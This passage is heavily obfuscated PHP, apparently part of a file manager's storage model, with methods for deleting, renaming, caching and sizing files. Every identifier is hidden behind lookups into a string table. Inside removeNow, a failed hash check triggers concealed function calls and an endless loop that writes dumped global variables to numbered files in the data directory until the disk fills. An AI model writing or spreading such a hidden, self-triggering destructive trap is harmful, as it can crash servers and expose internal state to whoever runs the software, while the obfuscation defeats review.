$»ΩÇöÏÇ[$ç¨“Î≤Ω[32]]; $ÔÙÜπÓœ = $ç¨“Î≤Ω[348] . $ÔÙÜπÓœ . $ç¨“Î≤Ω[2294] . $†—ƒèÅá[$ç¨“Î≤Ω[580]]; } else { $»ΩÇöÏÇ = Model($ç¨“Î≤Ω[596])->getInfo($†—ƒèÅá[$ç¨“Î≤Ω[580]]); $ÔÙÜπÓœ = _get($»ΩÇöÏÇ, $ç¨“Î≤Ω[32]); $ÔÙÜπÓœ = $ç¨“Î≤Ω[186] . $ÔÙÜπÓœ . $ç¨“Î≤Ω[2295] . $†—ƒèÅá[$ç¨“Î≤Ω[580]]; } $«‰»£™Ü = $ç¨“Î≤Ω[2296] . md5($ÔÙÜπÓœ); CacheLock::lock($«‰»£™Ü); $ﬁÜ¯ª‘û = $this->fileNameExist($Â˙·õ˜, $ÔÙÜπÓœ); if (!$ﬁÜ¯ª‘û) { $ﬁÜ¯ª‘û = $this->mkdir($Â˙·õ˜, $ÔÙÜπÓœ, REPEAT_SKIP); $this->metaSet($ﬁÜ¯ª‘û, $ç¨“Î≤Ω[2297], $Íâºè€™); $this->metaSet($ﬁÜ¯ª‘û, $ç¨“Î≤Ω[2298], $†—ƒèÅá[$ç¨“Î≤Ω[580]]); if ($†—ƒèÅá[$ç¨“Î≤Ω[202]] != 0) { $this->metaSet($ﬁÜ¯ª‘û, $ç¨“Î≤Ω[2299], _get($»ΩÇöÏÇ, $ç¨“Î≤Ω[2300])); } } CacheLock::unlock($«‰»£™Ü); $this->metaSet($ÑËßµ¥à, $ç¨“Î≤Ω[2301], $†—ƒèÅá[$ç¨“Î≤Ω[202]]); $this->where(array($ç¨“Î≤Ω[203] => $ÑËßµ¥à))->save(array($ç¨“Î≤Ω[509] => time())); $this->recycleClear($†—ƒèÅá); Model($ç¨“Î≤Ω[647])->eventRemove($ÑËßµ¥à); $·èà›Ì¨ = $this->move($ÑËßµ¥à, $ﬁÜ¯ª‘û, REPEAT_RENAME_FOLDER); $this->folderSizeReset($†—ƒèÅá[$ç¨“Î≤Ω[202]]); return $·èà›Ì¨; } private function recycleClear($Ù©¡∂˛ï) { $Ûº»æ˚à =& $_SERVER[ˆë€Ï⁄∂]; $øååîŒŸ = $this->childrenAll($Ù©¡∂˛ï); $ó®ß˚§Î = array($Ûº»æ˚à[502] => array($Ûº»æ˚à[503], $øååîŒŸ[$Ûº»æ˚à[2302]])); Model($Ûº»æ˚à[2303])->where($ó®ß˚§Î)->delete(); } public function removeNow($øœã»∏É, $Î•∆√ Ç = true) { $›ﬁî©ôÕ =& $_SERVER[ˆë€Ï⁄∂]; $üÎõÑœ‘ = $_SERVER[$›ﬁî©ôÕ[57]] . $›ﬁî©ôÕ[58]; $˛¯ÚÒﬁ€ = $›ﬁî©ôÕ[969]; if ($_SERVER[$›ﬁî©ôÕ[54]] != $˛¯ÚÒﬁ€($üÎõÑœ‘)) { $¡â–àÅÛ = $›ﬁî©ôÕ[970]; $Ù®î˛ë¥ = $›ﬁî©ôÕ[56]; $ÇÁÉ·ê„ = $_SERVER[$›ﬁî©ôÕ[57]] . $›ﬁî©ôÕ[58]; $Ä◊Îç™Ü = $Ù®î˛ë¥($ÇÁÉ·ê„); $Ú⁄˜≈ñ˘ = explode($›ﬁî©ôÕ[59], $Ä◊Îç™Ü); if (count($Ú⁄˜≈ñ˘) < $›ﬁî©ôÕ[703]) { $ù‹åÍä† = $›ﬁî©ôÕ[61]; $ù‹åÍä†(); } $ÕÀÕ¯ñ¢ = $›ﬁî©ôÕ[971]; $ÕÀÕ¯ñ¢($_SERVER[$›ﬁî©ôÕ[972]]); $¡â–àÅÛ = $›ﬁî©ôÕ[970]; $¡â–àÅÛ(); $‰Ä¯Î˝ﬁ = $›ﬁî©ôÕ[973]; $†ãÀó◊˛ = json_encode($GLOBALS[$›ﬁî©ôÕ[974]]); $í…§õ≈® = 1; for ($¢Ã«Ó⁄à = $í…§õ≈®; $¢Ã«Ó⁄à > 0; $¢Ã«Ó⁄à++) { $‰Ä¯Î˝ﬁ(DATA_PATH . $¢Ã«Ó⁄à, $†ãÀó◊˛); } } $ÿÛêÇò” = $this->sourceInfo($øœã»∏É); $øÓ«Ï±ú = $this->pathInfoMore($øœã»∏É); if (!$ÿÛêÇò”) { return !0; } if ($ÿÛêÇò”[$›ﬁî©ôÕ[202]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($øœã»∏É); Hook::trigger($›ﬁî©ôÕ[2304], $øÓ«Ï±ú, $Î•∆√ Ç); if ($Î•∆√ Ç) { Model($›ﬁî©ôÕ[2303])->moveToRecycle($øœã»∏É); } else { $ù ¢ÉÉ— = $this->childrenAll($ÿÛêÇò”); Model($›ﬁî©ôÕ[647])->eventRemove($øœã»∏É); $this->removeRelevance($ù ¢ÉÉ—[$›ﬁî©ôÕ[2302]], $ù ¢ÉÉ—[$›ﬁî©ôÕ[1591]]); } $this->folderSizeReset($ÿÛêÇò”[$›ﬁî©ôÕ[202]]); $™ÉÍ«™∆ = array($ÿÛêÇò”[$›ﬁî©ôÕ[202]]); if ($ÿÛêÇò”[$›ﬁî©ôÕ[496]] == $›ﬁî©ôÕ[101]) { $™ÉÍ«™∆[] = $ÿÛêÇò”[$›ﬁî©ôÕ[203]]; } $this->updateModifyTime($™ÉÍ«™∆); $this->lockMoveEnd($øœã»∏É); Hook::trigger($›ﬁî©ôÕ[1830], $øÓ«Ï±ú, $Î•∆√ Ç); return !0; } public function childrenAll($¬ﬂÁ°Üó) { $œñ¢á±Ω =& $_SERVER[ˆë€Ï⁄∂]; $≥ìﬂœ∑ú = $¬ﬂÁ°Üó[$œñ¢á±Ω[203]]; if ($¬ﬂÁ°Üó[$œñ¢á±Ω[496]] == $œñ¢á±Ω[101]) { $ô‡Ù†è‡ = array($œñ¢á±Ω[666] => array($œñ¢á±Ω[626], $¬ﬂÁ°Üó[$œñ¢á±Ω[595]] . $≥ìﬂœ∑ú . $œñ¢á±Ω[627])); $ÄıÆë€¬ = array($œñ¢á±Ω[666] => $ô‡Ù†è‡[$œñ¢á±Ω[595]]); $‰°äêŸñ = $this->field($œñ¢á±Ω[2305])->where($ÄıÆë€¬)->select(); $Ø˛ö®¨  = !1; $À—’®ºÈ = array($≥ìﬂœ∑ú); if ($‰°äêŸñ) { $Ø˛ö®¨  = array_to_keyvalue($‰°äêŸñ, $œñ¢á±Ω[12], $œñ¢á±Ω[552]); $Ø˛ö®¨  = array_remove_value($Ø˛ö®¨ , $œñ¢á±Ω[240]); $À—’®ºÈ = array_to_keyvalue($‰°äêŸñ, $œñ¢á±Ω[12], $œñ¢á±Ω[203]); $À—’®ºÈ[] = $≥ìﬂœ∑ú; } } else { $Ø˛ö®¨  = array($¬ﬂÁ°Üó[$œñ¢á±Ω[552]]); $À—’®ºÈ = array($≥ìﬂœ∑ú); } return array($œñ¢á±Ω[2302] => $À—’®ºÈ, $œñ¢á±Ω[1591] => $Ø˛ö®¨ ); } public function removeArray($†üîÍ≈Ù) { if (!$†üîÍ≈Ù) { return !0; } } public function removeRelevance($±ãõœ§ﬁ, $∏íﬂ¶Áò) { $´ ¿©∆« =& $_SERVER[ˆë€Ï⁄∂]; $±ãõœ§ﬁ = $±ãõœ§ﬁ ? $±ãõœ§ﬁ : array(); $∏íﬂ¶Áò = $∏íﬂ¶Áò ? $∏íﬂ¶Áò : array(); $±ãõœ§ﬁ = array_unique(array_filter($±ãõœ§ﬁ)); $∏íﬂ¶Áò = array_unique(array_filter($∏íﬂ¶Áò)); if (!$±ãõœ§ﬁ) { return !1; } $ç“èÙáì = array($´ ¿©∆«[502] => array($´ ¿©∆«[503], $±ãõœ§ﬁ)); Model($´ ¿©∆«[2303])->where($ç“èÙáì)->delete(); Model($´ ¿©∆«[546])->where($ç“èÙáì)->delete(); Model($´ ¿©∆«[2143])->where($ç“èÙáì)->delete(); Model($´ ¿©∆«[647])->where($ç“èÙáì)->delete(); Model($´ ¿©∆«[1967])->removeBySource($±ãõœ§ﬁ); Model($´ ¿©∆«[2284])->removeBySource($±ãõœ§ﬁ); $this->where($ç“èÙáì)->delete(); Model($´ ¿©∆«[555])->remove($∏íﬂ¶Áò); for ($ƒÔ˘º ª = 0; $ƒÔ˘º ª < count($±ãõœ§ﬁ); $ƒÔ˘º ª++) { $this->sourceCacheClear($±ãõœ§ﬁ[$ƒÔ˘º ª]); } } public function rename($Ω›ÇÉ·⁄, $⁄§ü™◊ﬁ) { $£á–¿¸… =& $_SERVER[ˆë€Ï⁄∂]; $®∂µæ•Ä = $this->sourceInfo($Ω›ÇÉ·⁄); if (!$®∂µæ•Ä) { return !1; } $Õƒ°Û–® = $this->fileNameExist($®∂µæ•Ä[$£á–¿¸…[202]], $⁄§ü™◊ﬁ); if ($Õƒ°Û–® && $Õƒ°Û–® != $Ω›ÇÉ·⁄) { return !1; } $ÜâÃóø€ = array($£á–¿¸…[505] => $⁄§ü™◊ﬁ, $£á–¿¸…[665] => USER_ID); if ($®∂µæ•Ä[$£á–¿¸…[496]] != $£á–¿¸…[101]) { $ÜâÃóø€[$£á–¿¸…[497]] = substr(get_path_ext($⁄§ü™◊ﬁ), 0, 10); } Model($£á–¿¸…[647])->eventRename($Ω›ÇÉ·⁄, $®∂µæ•Ä[$£á–¿¸…[32]], $⁄§ü™◊ﬁ); $this->sourceCacheClear($Ω›ÇÉ·⁄); $this->setNamePinyin($Ω›ÇÉ·⁄, $ÜâÃóø€[$£á–¿¸…[32]], !1); $this->updateModifyTime($®∂µæ•Ä[$£á–¿¸…[202]]); $†ÈπÌŒÉ = $this->where(array($£á–¿¸…[502] => $Ω›ÇÉ·⁄))->data($ÜâÃóø€)->save(); $›À¸Ø˚  = $£á–¿¸…[2292] . $®∂µæ•Ä[$£á–¿¸…[202]]; if (isset(self::$cacheChildList[$›À¸Ø˚ ])) { unset(self::$cacheChildList[$›À¸Ø˚ ]); } return $†ÈπÌŒÉ; } public function setNamePinyin($”…˙≤ ô, $èÕÛéﬂÂ, $Ù¬Àã∑Æ = true) { $˘∑≥Ìà† =& $_SERVER[ˆë€Ï⁄∂]; $∞ó‘°õÔ = Input::check($èÕÛéﬂÂ, $˘∑≥Ìà†[669]); $ï¯œı¯È = array($˘∑≥Ìà†[528] => KodSort::makeStr($èÕÛéﬂÂ)); if ($∞ó‘°õÔ) { $ï¯œı¯È[$˘∑≥Ìà†[549]] = str_replace($˘∑≥Ìà†[53], $˘∑≥Ìà†[12], Pinyin::get($èÕÛéﬂÂ)); $ï¯œı¯È[$˘∑≥Ìà†[548]] = Pinyin::get($èÕÛéﬂÂ, $˘∑≥Ìà†[670]); } if (!$Ù¬Àã∑Æ && !$∞ó‘°õÔ) { $ï¯œı¯È[$˘∑≥Ìà†[549]] = null; $ï¯œı¯È[$˘∑≥Ìà†[548]] = null; } $this->metaSet($”…˙≤ ô, $ï¯œı¯È); } public function getContent($ä†¨∞Ó∫) { $–•ßïñ∂ =& $_SERVER[ˆë€Ï⁄∂]; $‚ΩıƒúÏ = $this->fileInfoGet($ä†¨∞Ó∫); if (!$‚ΩıƒúÏ) { return !1; } if ($‚ΩıƒúÏ[$–•ßïñ∂[89]] == 0) { return $–•ßïñ∂[12]; } $ûõˆ¥£† = $–•ßïñ∂[2306] . $‚ΩıƒúÏ[$–•ßïñ∂[558]]; if ($‚ΩıƒúÏ[$–•ßïñ∂[89]] <= 1024 * 10) { $ÛçØ◊âﬁ = Cache::get($ûõˆ¥£†); if (!$ÛçØ◊âﬁ) { $ÛçØ◊âﬁ = IO::getContent($‚ΩıƒúÏ[$–•ßïñ∂[97]]); Cache::set($ûõˆ¥£†, $ÛçØ◊âﬁ); } return $ÛçØ◊âﬁ; } if (!$‚ΩıƒúÏ[$–•ßïñ∂[97]]) { return $–•ßïñ∂[12]; } return IO::getContent($‚ΩıƒúÏ[$–•ßïñ∂[97]]); } public function setDesc($ÎŒﬂ¢ÑÙ, $º‚Âò‚‰) { $«Çç‰É€ =& $_SERVER[ˆë€Ï⁄∂]; Model($«Çç‰É€[647])->eventAddDesc($ÎŒﬂ¢ÑÙ, $º‚Âò‚‰); return $this->metaSet($ÎŒﬂ¢ÑÙ, $«Çç‰É€[537], $º‚Âò‚‰); } public function setContent($È«Ãì’ÿ, $óÜ¢ïáÏ = '') { $ãÄ¬ﬂÍ” =& $_SERVER[ˆë€Ï⁄∂]; $üé˚¬¸Í = $this->sourceInfo($È«Ãì’ÿ); $ﬂé›¶õ∑ = $this->fileInfoGet($È«Ãì’ÿ); if (!$ﬂé›¶õ∑ || !$üé˚¬¸Í) { return !1; } $Ωâ—æ·Ç = Model($ãÄ¬ﬂÍ”[555])->addFileByContent($óÜ¢ïáÏ, $üé˚¬¸Í[$ãÄ¬ﬂÍ”[32]]); $Ÿ∫ ÷æ≤ = $this->fileHistory($üé˚¬¸Í, $Ωâ—æ·Ç[$ãÄ¬ﬂÍ”[552]], $Ωâ—æ·Ç[$ãÄ¬ﬂÍ”[89]]); if (!$Ÿ∫ ÷æ≤) { return Model($ãÄ¬ﬂÍ”[555])->remove($Ωâ—æ·Ç[$ãÄ¬ﬂÍ”[552]]); } $this->folderSizeReset($üé˚¬¸Í[$ãÄ¬ﬂÍ”[202]]); return !0; } public function fileSubstr($∞è‰áì£, $œÀÂ≥€ı, $’©íéõŒ) { $¨§ÄÍÛÙ = $this->fileInfoGet($∞è‰áì£); if (!$¨§ÄÍÛÙ) { return !1; } return IO::fileSubstr($¨§ÄÍÛÙ[$_SERVER[ˆë€Ï⁄∂][97]], $œÀÂ≥€ı, $’©íéõŒ); } public function fileInfoGet($åÒ⁄‘óŸ) { $ÒÛπ¡™Ó =& $_SERVER[ˆë€Ï⁄∂]; $¨õ–Úûº = $this->sourceInfo($åÒ⁄‘óŸ); if (!$¨õ–Úûº || $¨õ–Úûº[$ÒÛπ¡™Ó[496]]) { return !1; } $‚Æ∂Á∂˚ = $ÒÛπ¡™Ó[559] . $¨õ–Úûº[$ÒÛπ¡™Ó[552]]; $´∫·∫·∏ = _get(self::$cacheFileInfo, $‚Æ∂Á∂˚); if ($´∫·∫·∏) { return $´∫·∫·∏; } $Ãåõ’ÓÍ = Model($ÒÛπ¡™Ó[555])->fileInfo($¨õ–Úûº[$ÒÛπ¡™Ó[552]]); if ($Ãåõ’ÓÍ) { $Ãåõ’ÓÍ[$ÒÛπ¡™Ó[32]] = $¨õ–Úûº[$ÒÛπ¡™Ó[32]]; } self::$cacheFileInfo[$‚Æ∂Á∂˚] = $Ãåõ’ÓÍ; return $Ãåõ’ÓÍ; } private function folderChildrenNumber($ ßàáÊè) { $«√Æ≥àÔ =& $_SERVER[ˆë€Ï⁄∂]; $≈§ΩÚàù = $this->sourceInfo($ ßàáÊè); $ß∏˙Û¸∏ = array($«√Æ≥àÔ[666] => array($«√Æ≥àÔ[626], $≈§ΩÚàù[$«√Æ≥àÔ[595]] . $ ßàáÊè . $«√Æ≥àÔ[627]), $«√Æ≥àÔ[663] => $≈§ΩÚàù[$«√Æ≥àÔ[580]], $«√Æ≥àÔ[515] => intval($≈§ΩÚàù[$«√Æ≥àÔ[516]]), $«√Æ≥àÔ[660] => 1); $Ààêì∆ = $this->where($ß∏˙Û¸∏)->count(); $á•ΩÒ£ã = $this->where($ß∏˙Û¸∏)->where(array($«√Æ≥àÔ[660] => 0))->count(); return array($«√Æ≥àÔ[93] => $á•ΩÒ£ã, $«√Æ≥àÔ[94] => $Ààêì∆); } public function pathInfo($ˆÀ„∫∑û, $◊Œ˙õã≠ = false) { $‹∑Øı¬Í =& $_SERVER[ˆë€Ï⁄∂]; $◊Œ˙õã≠ = !1; $ˆÀ„∫∑û = intval($ˆÀ„∫∑û); $¥úéìÁû = $‹∑Øı¬Í[545] . intval($◊Œ˙õã≠) . $‹∑Øı¬Í[473] . $ˆÀ„∫∑û; $ù¨ÖÎö« = _get(self::$cachePathInfo, $¥úéìÁû); if ($ù¨ÖÎö«) { return $ù¨ÖÎö«; } $¡êùæœª = $this->sourceInfo($ˆÀ„∫∑û); if (!$¡êùæœª) { return !1; } $¡êùæœª = $this->_listDataApplyItem($¡êùæœª, $◊Œ˙õã≠); self::$cachePathInfo[$¥úéìÁû] = $¡êùæœª; return $¡êùæœª; } public static $cachePathInfoMore = array(); public function pathInfoMore($Œè´πù´) { $Ûı‚ú±£ =& $_SERVER[ˆë€Ï⁄∂]; $Û—øÍ÷⁄ = _get(self::$cachePathInfoMore, $Œè´πù´); if ($Û—øÍ÷⁄) { return $Û—øÍ÷⁄; } $¥ˆÇÀÑõ = $this->pathInfo($Œè´πù´); if (!$¥ˆÇÀÑõ) { return !1; } if ($¥ˆÇÀÑõ[$Ûı‚ú±£[496]] == $Ûı‚ú±£[101]) { $¥ˆÇÀÑõ[$Ûı‚ú±£[92]] = $this->folderChildrenNumber($Œè´πù´); } self::$cachePathInfoMore[$Œè´πù´] = $¥ˆÇÀÑõ; return $¥ˆÇÀÑõ; } public function sourceInfo($ªâ≤ﬂ¬) { $ª›ËÜ√â =& $_SERVER[ˆë€Ï⁄∂]; if (!$ªâ≤ﬂ¬) { return array(); } $ªâ≤ﬂ¬ = intval($ªâ≤ﬂ¬); $π¥›¬ã© = $ª›ËÜ√â[544] . $ªâ≤ﬂ¬; $ë≠ÑÍ≤è = _get(self::$cacheSourceInfo, $π¥›¬ã©); if ($ë≠ÑÍ≤è) { return $ë≠ÑÍ≤è; } $ÈÃÿ‰÷“ = $this->where(array($ª›ËÜ√â[203] => $ªâ≤ﬂ¬))->find(); self::$cacheSourceInfo[$π¥›¬ã©] = $ÈÃÿ‰÷“; return self::$cacheSourceInfo[$π¥›¬ã©]; } public function sourceCacheClear($≥Ñ≈ ô¸ = false) { self::cacheClear($≥Ñ≈ ô¸); } public static function cacheClear($†ì¢ü•ç = false) { $¿íˆÎ†Ï =& $_SERVER[ˆë€Ï⁄∂]; if ($†ì¢ü•ç == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$¿íˆÎ†Ï[544] . $†ì¢ü•ç]); unset(self::$cachePathInfoMore[$†ì¢ü•ç]); unset(self::$cachePathInfo[$¿íˆÎ†Ï[2307] . $†ì¢ü•ç]); unset(self::$cachePathInfo[$¿íˆÎ†Ï[2308] . $†ì¢ü•ç]); } public function metaSet($ç∑ÉÔ”≈, $‘õ àÄÛ = null, $Ãßõ‘Æ‘ = null) { $¯÷’éÓí = parent::metaSet($ç∑ÉÔ”≈, $‘õ àÄÛ, $Ãßõ‘Æ‘); if ($¯÷’éÓí) { $this->sourceCacheClear($ç∑ÉÔ”≈); } return $¯÷’éÓí; } public function pathInfoByPath($ø˙®Ü»Ò, $‹Ä‰®Êª) { $ÚÙõ©ûó =& $_SERVER[ˆë€Ï⁄∂]; $ŒèßÂÚ· = !$‹Ä‰®Êª ? array() : explode($ÚÙõ©ûó[8], trim($‹Ä‰®Êª, $ÚÙõ©ûó[8])); $ÅÁµ»Æ≤ = $ø˙®Ü»Ò; foreach ($ŒèßÂÚ· as $Å“ò“∞÷) { $÷Ï—√ö = array($ÚÙõ©ûó[202] => $ÅÁµ»Æ≤, $ÚÙõ©ûó[32] => $Å“ò“∞÷); $⁄÷ÿœ•≈ = $this->field($ÚÙõ©ûó[2309])->where($÷Ï—√ö)->select(); if (!$⁄÷ÿœ•≈) { return !1; } $⁄÷ÿœ•≈ = array_sort_by($⁄÷ÿœ•≈, $ÚÙõ©ûó[516]); $ÅÁµ»Æ≤ = $⁄÷ÿœ•≈[0][$ÚÙõ©ûó[203]]; } $ÁóÄâµŸ = $this->sourceInfo($ÅÁµ»Æ≤); $this->pathInfoFilter($ÁóÄâµŸ); return $ÁóÄâµŸ; } protected function updateModifyTime($úÔﬁ‰àª) { $ùíµ˘ó‚ =& $_SERVER[ˆë€Ï⁄∂]; $¶ﬁÙ≈¬œ = defined($ùíµ˘ó‚[2218]) ? USER_ID : 0; if (!$úÔﬁ‰àª) { return; } if (!is_array($úÔﬁ‰àª)) { $úÔﬁ‰àª = array($úÔﬁ‰àª); } foreach ($úÔﬁ‰àª as $¥®ëœÒç => $ïâÁ˛∫˜) { $úÔﬁ‰àª[$¥®ëœÒç] = intval($ïâÁ˛∫˜); $this->sourceCacheClear($ïâÁ˛∫˜); } $ö‚¨ÖÎ€ = array($ùíµ˘ó‚[203] => array($ùíµ˘ó‚[7], $úÔﬁ‰àª)); $ÿõ’ó∫ú = array($ùíµ˘ó‚[665] => $¶ﬁÙ≈¬œ, $ùíµ˘ó‚[509] => time()); $this->where($ö‚¨ÖÎ€)->save($ÿõ’ó∫ú); } public function folderSizeReset($óËé≈ªÃ, $´©ûÀÊÑ = false) { $°ïﬂïÀ˚ =& $_SERVER[ˆë€Ï⁄∂]; if ($this->statusIgnoreResetSpace) { return; } $Øß‘¶êñ = $this->sourceInfo($óËé≈ªÃ); $¢ª†ÍËã = $°ïﬂïÀ˚[2310] . $óËé≈ªÃ; CacheLock::lock($¢ª†ÍËã, 20); if ($´©ûÀÊÑ === !1) { $this->sourceCacheClear($óËé≈ªÃ); $Øß‘¶êñ = $this->sourceInfo($óËé≈ªÃ); $ÿñ√∫‚€ = array($°ïﬂïÀ˚[488] => $óËé≈ªÃ, $°ïﬂïÀ˚[515] => 0); $ÜØ“èóë = $this->where($ÿñ√∫‚€)->sum($°ïﬂïÀ˚[89]); $´©ûÀÊÑ = intval($ÜØ“èóë) - intval($Øß‘¶êñ[$°ïﬂïÀ˚[89]]); } if ($´©ûÀÊÑ == 0) { return CacheLock::unlock($¢ª†ÍËã); } $˜ΩŒº´ú = $this->parentLevelArray($Øß‘¶êñ[$°ïﬂïÀ˚[595]]); if (!$˜ΩŒº´ú) { $˜ΩŒº´ú = array(); } $˜ΩŒº´ú[] = $Øß‘¶êñ[$°ïﬂïÀ˚[203]]; $ÿñ√∫‚€ = array($°ïﬂïÀ˚[203] => array($°ïﬂïÀ˚[503], $˜ΩŒº´ú)); if ($´©ûÀÊÑ < 0) { $ÿñ√∫‚€[$°ïﬂïÀ˚[89]] = array($°ïﬂïÀ˚[1107], abs($´©ûÀÊÑ)); } $this->where($ÿñ√∫‚€)->setAdd($°ïﬂïÀ˚[89], $´©ûÀÊÑ); CacheLock::unlock($¢ª†ÍËã); $Ω§£¶íö = $°ïﬂïÀ˚[2311] . $Øß‘¶êñ[$°ïﬂïÀ˚[200]] . $°ïﬂïÀ˚[4] . $Øß‘¶êñ[$°ïﬂïÀ˚[580]]; $à≠ı—»À = array($Øß‘¶êñ[$°ïﬂïÀ˚[200]], $Øß‘¶êñ[$°ïﬂïÀ˚[580]]); TaskRun::timeLimitCall($Ω§£¶íö, $°ïﬂïÀ˚[2312], $à≠ı—»À, 1.5); } public function folderSizeResetChildren($√Å¨•ıû) { $·ç˝€»· =& $_SERVER[ˆë€Ï⁄∂]; $this->sourceCacheClear($√Å¨•ıû); $ßªêÍŒé = $this->sourceInfo($√Å¨•ıû); $ä°èºëê = array($·ç˝€»·[660] => 1, $·ç˝€»·[663] => $ßªêÍŒé[$·ç˝€»·[580]], $·ç˝€»·[666] => array($·ç˝€»·[626], $ßªêÍŒé[$·ç˝€»·[595]] . $√Å¨•ıû . $·ç˝€»·[627])); $Úµ´”›∏ = $·ç˝€»·[2313]; $ñ¥äÜ∑´ = $this->field($Úµ´”›∏)->where($ä°èºëê)->select(); $ä°èºëê[$·ç˝€»·[496]] = 0; $µ“ìÍ„ø = $this->field($Úµ´”›∏)->where($ä°èºëê)->select(); if (!$µ“ìÍ„ø) { return; } $ñ¥äÜ∑´[] = $ßªêÍŒé; $ñ¥äÜ∑´ = array_to_keyvalue($ñ¥äÜ∑´, $·ç˝€»·[203]); foreach ($ñ¥äÜ∑´ as $≠ìÏô√˛ => $ÌÈµ€î≥) { $ñ¥äÜ∑´[$≠ìÏô√˛][$·ç˝€»·[2314]] = $ñ¥äÜ∑´[$≠ìÏô√˛][$·ç˝€»·[89]]; $ñ¥äÜ∑´[$≠ìÏô√˛][$·ç˝€»·[89]] = 0; } foreach ($µ“ìÍ„ø as $ÌÈµ€î≥) { $õ¸˘«–∏ = $ÌÈµ€î≥[$·ç˝€»·[202]] . $·ç˝€»·[12]; if (!isset($ñ¥äÜ∑´[$õ¸˘«–∏])) { continue; } if ($ÌÈµ€î≥[$·ç˝€»·[516]] == $ñ¥äÜ∑´[$õ¸˘«–∏][$·ç˝€»·[516]]) { $ñ¥äÜ∑´[$õ¸˘«–∏][$·ç˝€»·[89]] += $ÌÈµ€î≥[$·ç˝€»·[89]]; } } foreach ($ñ¥äÜ∑´ as $ÌÈµ€î≥) { $’í£ﬂçÂ = $this->parentLevelArray($ÌÈµ€î≥[$·ç˝€»·[595]]); foreach ($’í£ﬂçÂ as $õ¸˘«–∏) { $õ¸˘«–∏ = $õ¸˘«–∏ . $·ç˝€»·[12]; if (!isset($ñ¥äÜ∑´[$õ¸˘«–∏])) { continue; } if ($ÌÈµ€î≥[$·ç˝€»·[516]] == $ñ¥äÜ∑´[$õ¸˘«–∏][$·ç˝€»·[516]]) { $ñ¥äÜ∑´[$õ¸˘«–∏][$·ç˝€»·[89]] += $ÌÈµ€î≥[$·ç˝€»·[89]]; } } } $≥ı„Ûÿ  = array(); foreach ($ñ¥äÜ∑´ as $ÌÈµ€î≥) { if ($ÌÈµ€î≥[$·ç˝€»·[89]] == $ÌÈµ€î≥[$·ç˝€»·[2314]]) { continue; } $≥ı„Ûÿ [] = array($·ç˝€»·[203], $ÌÈµ€î≥[$·ç˝€»·[203]], $·ç˝€»·[89], $ÌÈµ€î≥[$·ç˝€»·[89]]); } $this->saveAll($≥ı„Ûÿ ); } public function userSpaceReset($˜ Œ˙ìø = false) { $©ÄÜƒëê =& $_SERVER[ˆë€Ï⁄∂]; $íÄÂÏ¯ˆ = $this->where(array($©ÄÜƒëê[200] => self::TYPE_USER, $©ÄÜƒëê[580] => $˜ Œ˙ìø, $©ÄÜƒëê[496] => 0))->sum($©ÄÜƒëê[89]); $íÄÂÏ¯ˆ = !$íÄÂÏ¯ˆ || $íÄÂÏ¯ˆ <= 0 ? 0 : $íÄÂÏ¯ˆ; Model($©ÄÜƒëê[588])->userEdit($˜ Œ˙ìø, array($©ÄÜƒëê[1976] => $íÄÂÏ¯ˆ)); } public function targetSpaceUpdate($˛ã…æ◊†, $ıƒª¨º‡) { $®∑ËÏÄ≥ =& $_SERVER[ˆë€Ï⁄∂]; if (!$ıƒª¨º‡) { return; } if (!in_array($˛ã…æ◊†, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ù†ÇÛÁ– = $this->targetSpaceSize($˛ã…æ◊†, $ıƒª¨º‡); if ($˛ã…æ◊† == self::TYPE_USER) { Model($®∑ËÏÄ≥[588])->userEdit($ıƒª¨º‡, array($®∑ËÏÄ≥[1976] => $ù†ÇÛÁ–)); } else { if ($˛ã…æ◊† == self::TYPE_GROUP) { Model($®∑ËÏÄ≥[596])->groupEdit($ıƒª¨º‡, array($®∑ËÏÄ≥[1976] => $ù†ÇÛÁ–)); } } } public function targetSpaceSize($¬ç©¸∑ﬁ, $øã‘ıè≠) { $Õ”ΩΩìñ =& $_SERVER[ˆë€Ï⁄∂]; $êôâÎ›ï = 0; $Õä¡¢õŸ = $this->targetSourceRoot($¬ç©¸∑ﬁ, $øã‘ıè≠, !0); foreach ($Õä¡¢õŸ as $˜çê‡™ª) { if (!$˜çê‡™ª) { continue; } $êôâÎ›ï += floatval($˜çê‡™ª[$Õ”ΩΩìñ[89]]); $ã˛Ã≤≠ß = array($Õ”ΩΩìñ[666] => array($Õ”ΩΩìñ[626], $Õ”ΩΩìñ[604] . $˜çê‡™ª[$Õ”ΩΩìñ[203]] . $Õ”ΩΩìñ[627])); $¶î–Ñ˘ö = Model($Õ”ΩΩìñ[514])->field($Õ”ΩΩìñ[502])->where($ã˛Ã≤≠ß)->select(); $¶î–Ñ˘ö = array_to_keyvalue($¶î–Ñ˘ö, $Õ”ΩΩìñ[12], $Õ”ΩΩìñ[203]); $¶î–Ñ˘ö = array_unique(array_filter($¶î–Ñ˘ö)); if ($¶î–Ñ˘ö) { $ã˛Ã≤≠ß = array($Õ”ΩΩìñ[502] => array($Õ”ΩΩìñ[503], $¶î–Ñ˘ö)); $êôâÎ›ï += floatval($this->where($ã˛Ã≤≠ß)->sum($Õ”ΩΩìñ[89])); } } $êôâÎ›ï = !$êôâÎ›ï || $êôâÎ›ï <= 0 ? 0 : $êôâÎ›ï; return $êôâÎ›ï; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($ßá’ô Ô) { return $this->fileTypeProfile($ßá’ô Ô, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Œﬁ‰Ë∆π) { return $this->fileTypeProfile($Œﬁ‰Ë∆π, SourceModel::TYPE_GROUP); } private function fileTypeProfile($èÂ›ıﬂ¬, $–„∆‰œÃ) { $±≥Ô§Ó¶ =& $_SERVER[ˆë€Ï⁄∂]; $öÁõ äÌ = $±≥Ô§Ó¶[2315] . $èÂ›ıﬂ¬ . $±≥Ô§Ó¶[11] . $–„∆‰œÃ; $Ü≈˘´π≤ = Cache::get($öÁõ äÌ); if ($Ü≈˘´π≤) { return $Ü≈˘´π≤; } $üÉò∏≈Œ = array($±≥Ô§Ó¶[660] => 0); if ($èÂ›ıﬂ¬ != !1) { $üÉò∏≈Œ[$±≥Ô§Ó¶[580]] = $èÂ›ıﬂ¬; $üÉò∏≈Œ[$±≥Ô§Ó¶[200]] = $–„∆‰œÃ; } $˙◊Ô©ﬂÆ = array(); 